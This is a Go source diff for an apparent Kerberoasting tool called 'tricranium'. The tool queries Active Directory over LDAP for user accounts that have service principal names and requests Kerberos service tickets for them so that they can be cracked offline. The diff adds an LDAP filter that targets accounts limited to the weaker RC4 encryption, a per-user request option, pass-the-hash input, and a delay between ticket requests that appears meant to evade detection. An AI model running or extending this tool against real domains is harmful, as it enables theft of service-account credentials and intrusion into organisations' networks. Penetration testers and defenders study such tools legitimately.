@@ -19,7 +19,8 @@ import (
 	"github.com/mfdooom/gokrb5/v8/iana/etypeID"
 )
 
-const libdeafult = `[libdefaults]
+const (
+	libdeafult = `[libdefaults]
 default_realm = %s
 dns_lookup_realm = false
 dns_lookup_kdc = false
@@ -37,6 +38,7 @@ udp_preference_limit=1
 kdc = %s:88
 default_domain = %s
 	}`
+)
 
 type LDAPResult struct {
 	spn         string
@@ -52,6 +54,8 @@ type FlagOptions struct {
 	request     bool
 	requestUser string
 	hash        string
+	rc4         bool
+	delay       int
 }
 
 func options() *FlagOptions {
@@ -59,8 +63,16 @@ func options() *FlagOptions {
 	request := flag.Bool("request", false, "Requests TGS for users")
 	requestUser := flag.String("request-user", "", "Requests TGS for the SPN associated to the user specified")
 	hash := flag.String("hash", "", "NTLM Hash in the format LMHASH:NTHASH")
+	rc4 := flag.Bool("rc4", false, "Only request accounts with RC4 specefied")
+	delay := flag.Int("delay", 0, "number of seconds delayed between TGS requests")
+
+	flag.Usage = func() {
+		fmt.Fprintf(flag.CommandLine.Output(), "Usage: tricranium [-dc-ip ip address] [-request] [-rc4] [request-user domain/username] [-hash NT:LM] [-delay seconds] domain/username[:password]\n")
+		flag.PrintDefaults()
+	}
+
 	flag.Parse()
-	return &FlagOptions{dcIp: *dcIp, request: *request, requestUser: *requestUser, hash: *hash}
+	return &FlagOptions{dcIp: *dcIp, request: *request, requestUser: *requestUser, hash: *hash, rc4: *rc4, delay: *delay}
 
 }
 
@@ -117,6 +129,24 @@ func main() {
 	var LDAPResults []LDAPResult
 	var nthash string
 	var baseDN string
+	var onlyRC4LdapFilter string
+	var reqUserLdapFilter string
+
+	if opt.rc4 {
+		onlyRC4LdapFilter = "(!(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))"
+	} else {
+		onlyRC4LdapFilter = ""
+	}
+
+	if opt.requestUser != "" {
+		reqUserLdapFilter = fmt.Sprintf("(sAMAccountName:=%s)", opt.requestUser)
+		opt.request = true
+
+	} else {
+		reqUserLdapFilter = ""
+	}
+
+	spnFilter := "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))" + reqUserLdapFilter + onlyRC4LdapFilter + ")"
 
 	l := log.New(os.Stderr, "GOKRB5 Client: ", log.Ldate|log.Ltime|log.Lshortfile)
 
@@ -193,7 +223,7 @@ func main() {
 		}
 	}
 
-	searchRequest := ldap.NewSearchRequest(baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))", []string{"dn", "cn", "lastLogon", "servicePrincipalName", "sAMAccountName", "pwdLastSet", "MemberOf", "userAccountControl"}, nil)
+	searchRequest := ldap.NewSearchRequest(baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, spnFilter, []string{"dn", "cn", "lastLogon", "servicePrincipalName", "sAMAccountName", "pwdLastSet", "MemberOf", "userAccountControl"}, nil)
 	sr, err := lconn.Search(searchRequest)
 	if err != nil {
 		log.Fatal(err)
@@ -246,6 +276,9 @@ func main() {
 
 		for i := range LDAPResults {
 
+			if opt.delay > 0 && i > 0 {
+				time.Sleep(time.Duration(opt.delay) * time.Second)
+			}
 			// send TGS_REQ
 			tgsUsername := domain + "\\" + LDAPResults[i].accountName
 			tgt, _, err := cl.GetServiceTicket(tgsUsername)
